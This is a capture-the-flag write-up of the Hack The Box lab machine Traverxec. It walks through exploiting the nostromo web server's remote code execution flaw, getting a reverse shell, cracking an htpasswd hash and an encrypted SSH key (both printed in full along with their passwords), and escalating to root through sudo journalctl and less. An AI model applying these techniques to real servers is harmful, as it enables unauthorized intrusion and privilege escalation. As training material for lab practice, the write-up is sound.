# Traverxec
>Author : Xyan1d3
>Date : 23nd June 2021
>IP : 10.10.10.165
>OS : Linux
>Difficulty : Easy

# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Wed Jun 23 22:12:50 2021 as: nmap -sC -sV -v -oN nmap/traverxec 10.10.10.165
Nmap scan report for traverxec.htb (10.10.10.165)
Host is up (0.14s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Here, The box is running `Debian` as confirmed from the SSH banner of `22/tcp`.
![[Pasted image 20210623221628.png]]

On reverse searching the SSH banner version we get to know that we are up against Debian Buster.

We also, get to know that the `80/tcp` is running something odd as an webserver which is `nostromo 1.9.6`.
We may now look for some exploit for this webserver.

# Initial FootHold
We look for some exploits of this uncommon webserver `nostromo 1.9.6`.
The Nostromo 1.9.6 is vulnerable to `CVE-2019-16278` which is a RCE.
We do a `searchsploit` and find out that we have a python exploit.

![[Pasted image 20210623222215.png]]

We have to modify the exploit little bit and need to remove a line from the exploit.
![[Pasted image 20210623222552.png]]

We need to run the exploit using the `IP` ,`Port` and `Command`.
Command Run : 
```python
python2 nostromo_exploit.py 10.10.10.165 80 id
```
![[Pasted image 20210623222759.png]]

We could now, run a bash reverse shell and get an inital foothold on the box.
We create a `bash -i` reverse shell and `base64` encode it and send the payload to the command and get a Initial shell as `www-data` into the box.
![[Pasted image 20210623223218.png]]

# User Escalation as user david
We search for the `nostromo` web directory which we find out at `/var/nostromo`.
![[Pasted image 20210623224041.png]]
Here are two important lines which states that the pages are locked by `.httpasswd` and there is a `public_www` inside the home of the regular users.

We read the webserver config from `nhttpd.conf`
```python
www-data@traverxec:/var/nostromo/conf$ cat .htpasswd 
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

We crack the hash with `rockyou.txt` and find out that the password is `Nowonly4me`.
![[Pasted image 20210623224507.png]]

We find out that the directory contains a `backup-ssh-identity-files.tgz` archive.
![[Pasted image 20210623224754.png]]

We transfer it to our box and decompress it and find out that we have a ssh private key inside the archive.
![[Pasted image 20210623225111.png]]

We see that our SSH Key is encrypted, So we do a `ssh2john.py` and crack the hash with JtR.
```python
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----
```

We crack the passphrase which turns out to be `hunter`.
![[Pasted image 20210623225349.png]]

We do an `openssl` to remove the passphrase from the SSH private key.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.15]─[~/htb/htb-tjnull/traverxec/home/david/.ssh]    
└──╼ # openssl rsa -in id_rsa
Enter pass phrase for id_rsa:
writing RSA key
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEArF67DEHNFO9RlVzEHEzmCB9mbwsKcU8TdYzmG07rbzcmE4RC
I2KQlbOQyoWYtqzbpyPGfhMvxQvW6ZgoibWqNMcSGydNnPh+qtd2gBa07+tRgM4u
Z3l+C49hP6SIXdyQRWESEMPewuujDt1FasSnJxqwr2J4SbyjMO50kSP3F0zxwBJ8
FNPjVtswSiHfHEUS8RhcjOPaYw2T7AFYBpX3QQ9/NL1WvXTKyf09d7w02WRqA4HK
vYEbQ9QejSaCx2kVh+IpEbkLy1o5N51gw2kY8OjMZkbS5PIdDDO/iIgWHOjSb20M
6RuTOaDNBb4WsEHrTe9SnGeI1FcTd5vmJGqhwwIDAQABAoIBAFgqtF5WogHdT8uo
gZ9ALkFlXk3aReMjYX61LVY2jfJ7MPy2n+XdmrsX+C2/HBgEXu4lPHhsc/jET494
hvO5enA4iyhceDScXp4gS7rE4pP9t9i8nbvLxw8+ra2SCTaJhToXptfweFcXlHYb
9E/ieuVjn5B2O7TrykVTE0jSLqc5m1+SdvNPtVX+4cj0n1O6uZMaijg4itca8ffI
kCvx5fh6gR3A3EpFqyJxg7SSVOQ0UpRM333aEHAPLIhCy1ituS+T75FBPA6quByl
vy86PRn25B3m0ArqYlV1ffD16kNb/hr0b8VSOcRxaVFwIuW8g06bclhBu5R+HsQ4
c7IWdxECgYEA03M/rzWIoILIBOT7+N5heGWcVrcSukmGmMPN0/W6uGkiiP6Njnpy
8bAhDQ8bB2vWqjWl3I+XKLMB7x5qIgJ0/8/bTIoKMLajinUsmjM7NFU/p308LYPt
3oGUgy5/08GOwf8IULTAsm072gKo6y/Foq74uHOBBpZABU6dEE1VaN0CgYEA0K+o
6ozrL3qlhblg6grMdE0bPU2OQ9PGTApKo/AYGJCn1jYr6vB4IYb//Tn0DkvdwupJ
kMarBK3f0e6kR4LLqCLu34uKhndYIifzGyvWIO/hD15Zw3B8RQTH/Xt3mBPat6lz
i4OnwcHoXV7dmijlazjmUDUeYXLRD/HNhIUIOx8CgYEAoyxWwtCfBK6nyA8k2yJR
OWXARbK1QwimU5EWbzE7zD9lpS468u5PcW8nsjor84gmeec4fYJZddDd9zcTU/dt
blNquh/0SS9H+Pr/Vmeekn4OxyN/ougiUgjRIIJrpm/ByLcUJaO26HofK9fNnuCY
tTgtO7n2oayk7vOBhSkIdgkCgYAWR7rcF+GANzL23Pzo3/BGNnlDCUW4HiMcuTiQ
2jBoZwFUUIJN2hCpW7V2/rn80MLDbaofB+b4X+v2iOkHLYK618fzG/3VL2a8dtFw
xDRfXd0EfAlPYXITGFiVypnRJcWDOFc6vPqrKB274kX8kIM1+GQ2igVNWCnT7vgH
PwDK9wKBgH0ORm/d/mdGqmAPNQZ1GKrGBiWCRZ4LTr92Y+QHEuEOEIHqo+fZsRty
OwJfz7ILF078OKHoWWUGk/nDQesGs0VqE3hgCN8Z9/tNOOivvpw45C1x5XkiSZkr
GaUwbDziJwQ5lb5D+we+E0nyOsfgfKvnKSp/09A90golZK4CbtVQ
-----END RSA PRIVATE KEY-----
```

We use this SSH key to SSH into the `david` user.
![[Pasted image 20210623230024.png]]

We could now get the `user.txt`.
![[Pasted image 20210623230144.png]]

# Root Escalation
We have a bin directory which has a `server-stats.sh` which issues sudo `journalctl`.
```python
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash
cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

The journalctl command by default calls less command.
But, It is reading 5 lines So, To get the `less` editor we need to shrink the terminal size and in less issue `!/bin/bash` to get bash shell as `root`.


![[Pasted image 20210623231035.png]]

We get the `root.txt`
![[Pasted image 20210623231100.png]]